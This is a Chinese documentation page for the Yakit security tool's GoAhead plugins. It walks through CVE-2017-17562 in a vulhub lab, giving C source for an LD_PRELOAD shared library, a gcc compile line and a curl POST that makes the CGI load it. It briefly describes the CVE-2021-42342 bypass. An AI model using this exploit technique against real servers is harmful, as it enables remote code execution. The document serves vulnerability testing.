---
sidebar_position: 29
---
# Goahead插件使用

## 1 CVE-2017-17562 远程命令执行漏洞

**插件id：**

Yakit正在努力编写~

**漏洞描述：**

可以指定LD_PRELOAD=/proc/self/fd/0，因为/proc/self/fd/0是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。

**测试过程：**

启动vulhub靶场，访问http://your-ip:8080/cgi-bin/index即可查看到Hello页面，即为CGI执行的结果。
首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在Linux x86_64的机器中，所以我们直接用Linux PC编译即可。动态链接库源码：

```go
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "vuln find!\n", 14);
}
```

![](/img/products/yakit/Goahead-1.png)

before_main函数将在程序执行前被调用。编译以上代码

```go
gcc -shared -fPIC ./payload.c -o payload.so
```

将payload.so作为post body发送

```go
curl -X POST --data-binary @payload.so "http://your-ip:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0" -i 
```

![](/img/products/yakit/Goahead-2.png)

可见，vuln find！已被成功输出，说明我们的动态链接库中的代码已被执行

## 2 CVE-2021-42342 环境变量注入

**插件id：**

Yakit正在努力编写~

**漏洞描述：**

这个漏洞是CVE-2017-17562漏洞补丁的绕过，攻击者可以利用该补丁没有考虑到的multipart表单控制目标服务器的环境变量，进而劫持LD_PRELOAD来执行任意代码。

**测试过程：**

暂无案例
